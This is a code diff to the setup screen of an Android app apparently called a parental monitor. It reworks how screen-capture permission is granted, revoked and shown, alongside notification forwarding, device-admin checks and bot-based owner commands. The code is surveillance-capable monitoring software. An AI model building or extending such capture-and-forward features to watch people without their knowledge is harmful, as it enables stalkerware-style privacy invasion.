@@ -172,25 +172,15 @@ class SetupActivity : AppCompatActivity() {
         ActivityResultContracts.StartActivityForResult()
     ) { res ->
         try { shotRequestBusy.set(false) } catch (_: Exception) { }
-        if (res.resultCode == RESULT_OK && res.data != null) {
-            lifecycleScope.launch(ioExceptionHandler + kotlinx.coroutines.Dispatchers.IO) {
-                try {
-                    val uri = res.data?.toUri(Intent.URI_INTENT_SCHEME).orEmpty()
-                    prefs.saveScreenshotConsentSync(res.resultCode, uri)
-                } catch (_: Exception) {
-                }
-                kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.Main) {
-                    if (!isFinishing && !isDestroyed) {
-                        Toast.makeText(this@SetupActivity, getString(R.string.setup_shot_ok), Toast.LENGTH_SHORT).show()
-                        updateStatus()
-                    }
-                }
-            }
+        val data = res.data
+        if (res.resultCode == RESULT_OK && data != null) {
+            try { com.redeye.parentalmonitor.utils.ScreenCapture.grant(res.resultCode, data) } catch (_: Exception) { }
+            Toast.makeText(this, getString(R.string.setup_shot_ok), Toast.LENGTH_SHORT).show()
         } else {
-            try { prefs.clearScreenshotConsentSync() } catch (_: Exception) { }
+            try { com.redeye.parentalmonitor.utils.ScreenCapture.revoke() } catch (_: Exception) { }
             Toast.makeText(this, getString(R.string.setup_shot_denied), Toast.LENGTH_SHORT).show()
-            try { updateStatus() } catch (_: Exception) { }
         }
+        try { updateStatus() } catch (_: Exception) { }
     }
 
     companion object {
@@ -476,7 +466,7 @@ class SetupActivity : AppCompatActivity() {
             try { prefs.initialSyncDone = false } catch (_: Exception) { }
             try { prefs.initialSyncStarted = false } catch (_: Exception) { }
             try { prefs.clearWakePingIds() } catch (_: Exception) { }
-            try { prefs.clearScreenshotConsentSync() } catch (_: Exception) { }
+            try { com.redeye.parentalmonitor.utils.ScreenCapture.revoke() } catch (_: Exception) { }
             try { prefs.pendingMsgDrops = 0 } catch (_: Exception) { }
             try { prefs.pendingNotifDrops = 0 } catch (_: Exception) { }
             try { prefs.monitoringPaused = false } catch (_: Exception) { }
@@ -1278,6 +1268,7 @@ class SetupActivity : AppCompatActivity() {
     private fun requestScreenCapture() {
         try {
             if (!shotRequestBusy.compareAndSet(false, true)) return
+            try { com.redeye.parentalmonitor.utils.ScreenCapture.revoke() } catch (_: Exception) { }
             val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
             screenCaptureLauncher.launch(mpm.createScreenCaptureIntent())
         } catch (e: Exception) {
@@ -1327,7 +1318,7 @@ class SetupActivity : AppCompatActivity() {
             val pairCode = try { if (!configured || ownerKnown) prefs.ownerPairCode.takeIf { it.matches(PAIR_CODE_REGEX) }.orEmpty() else prefs.ownerPairCode.takeIf { it.matches(PAIR_CODE_REGEX) } ?: prefs.ensureOwnerPairCode() } catch (_: Exception) { "" }
             val ownerLine = if (ownerKnown) "\nOwner: recognized" else if (pairCode.isNotEmpty()) "\nOwner: unknown - DM the bot /start <chat ID> $pairCode privately to unlock owner commands" else "\nOwner: unknown - DM the bot /start <chat ID> privately to unlock owner commands"
             val notifOn = b(PreferencesManager.KEY_NOTIF_FORWARD, true)
-            val shotOn = try { prefs.hasScreenshotConsent() } catch (_: Exception) { false }
+            val shotOn = try { com.redeye.parentalmonitor.utils.ScreenCapture.granted() } catch (_: Exception) { false }
             val postOn = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) true else try { ContextCompat.checkSelfPermission(this@SetupActivity, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED } catch (_: Exception) { false }
             val listener = isNotificationAccessGranted()
             val adminOn = try { (getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager).isAdminActive(ComponentName(this@SetupActivity, AdminReceiver::class.java)) } catch (_: Exception) { false }
